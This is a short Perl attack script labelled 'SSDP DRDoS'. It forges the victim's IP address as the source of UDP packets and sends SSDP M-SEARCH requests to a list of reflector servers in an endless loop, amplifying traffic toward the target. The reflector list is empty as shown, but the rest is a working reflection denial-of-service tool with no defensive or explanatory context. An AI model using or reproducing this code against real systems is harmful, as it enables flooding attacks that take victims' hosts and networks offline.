#!/usr/bin/perl
# SSDP DRDoS
# by ShadowHatesYou
use Net::RawIP;
@ssdpservers = qw(

);
if ($ARGV[0] eq '') { print "Use: $0 <IP>\n"; exit; }
my $target = "$ARGV[0]";
my $post = "M-SEARCH * HTTP\/1.1\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\n";
my $sock =  new Net::RawIP({udp=>{}});
while () {
        for (my $i=0; $i < @ssdpservers; $i++) {
                $sock->set({ip => {saddr => $target, daddr => $ssdpservers[$i]},udp => {source => 1900,dest => 1900, data=>$post} });
                $sock->send;
        }
}

